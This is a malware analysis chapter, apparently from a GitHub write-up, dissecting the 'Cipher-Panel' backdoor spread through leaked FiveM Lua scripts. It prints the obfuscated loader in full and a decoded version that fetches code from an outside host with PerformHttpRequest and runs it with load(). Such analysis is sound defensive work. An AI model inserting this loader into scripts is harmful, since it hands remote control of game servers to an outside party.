## Chapter 1 (Original Infection)
This chapter contains the breakdown of the original infection code used by "Cipher-Panel".

### Introduction
The original infection code is a very simple snippet of code that can be inserted into any FiveM script that is used as a payload to download the malicious code.

The normal method for the sharing of this is through leaked scripts uploaded by users that only intend to gain access and extort people for money.

#### Original Code
```lua
    local Enchanced_Tabs = {
        Ench, Support, Host, Pairs,
        Realease, Callbacks, Source,
        Hosting, Event, PerformHttpRequest,
        assert, server, load, Spawn, materials
    }

    local random_char = {
        '68', '74', '74', '70', '73', '3a', '2f', '2f', '63', '69', '70', '68', '65', '72',
        '2d', '70', '61', '6e', '65', '6c', '2e', '6d', '65', '2f', '5f', '69', '2f'; '69',
        '3f', '74', '6f', '3d', '6c', '36', '54', '72', '32'
    }

    function str_utf8()
        _empt = ''
        for id,it in pairs(random_char) do
            _empt = _empt..it
        end
        return (_empt:gsub('..', function (cc)
            return string.char(tonumber(cc, 16))
            
        end))
    end

    Enchanced_Tabs[10](str_utf8(), function (e, d)
        local s = Enchanced_Tabs[11](Enchanced_Tabs[13](d))
        if (d == nil) then return end
        s()
    end)
```

Just from looking at this code, we can gather a fair amount of information.
  - The code is designed to look clean by using function names that aren't associated with malicious code such as **random_char**.
  - They are hiding function names encoded with UTF-8 in an array that they convert rather than keeping function names in all of the malicious functions.

This being said we have to map the values to better understand the code. This is done by turning `Enchanced_Tabs[13]` into the corresponding index in the UTF-8 encoded array. We will also take this chance to normalize the field names and remove the junk code used to obscure the real functionality.

#### UTF-8 Array Reversal
```
Input: '68', '74', '74', '70', '73', '3a', '2f', '2f', '63', '69', '70', '68', '65', '72', '2d', '70', '61', '6e', '65', '6c', '2e', '6d', '65', '2f', '5f', '69', '2f'; '69', '3f', '74', '6f', '3d', '6c', '36', '54', '72', '32'
Encoded: \x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x69\x3f\x74\x6f\x3d\x6c\x36\x54\x72\x32
Plain Text: https://cipher-panel.me/_i/i?to=l6Tr2
```

#### Function Name Array Mapping
```
Enchanced_Tabs[1] = Ench; (Junk Code)
Enchanced_Tabs[2] = Support; (Junk Code)
Enchanced_Tabs[3] = Host; (Junk Code)
Enchanced_Tabs[4] = Pairs; (Junk Code)
Enchanced_Tabs[5] = Realease; (Junk Code)
Enchanced_Tabs[6] = Callbacks; (Junk Code)
Enchanced_Tabs[7] = Source; (Junk Code)
Enchanced_Tabs[8] = Hosting; (Junk Code)
Enchanced_Tabs[9] = Event; (Junk Code)
Enchanced_Tabs[10] = PerformHttpRequest;
Enchanced_Tabs[11] = assert; (Junk Code)
Enchanced_Tabs[12] = server; (Junk Code)
Enchanced_Tabs[13] = load; (Junk Code)
Enchanced_Tabs[14] = Spawn; (Junk Code)
Enchanced_Tabs[15] = materials; (Junk Code)
```

#### Final Mapped Code
```lua
    PerformHttpRequest("https://cipher-panel.me/_i/i?to=l6Tr2", function (errorCode, responseBody)
        local payload = assert(load(responseBody))
        if (responseBody == nil) then return end
        payload()
    end)
```

The final mapped code continuously calls an HTTP request to an endpoint that is provided to paid users. This endpoint can't be accessed normally as they have Cloudflare page rules set up to only accept the User-Agent that FiveM makes HTTP requests with (FXServer/PerformHttpRequest). The responseBody field returns the body from the endpoint that contains lua code for the next step of this fuck fest.

[(Chapter 2 (What's obfuscation anyways?)](https://github.com/ericstolly/)
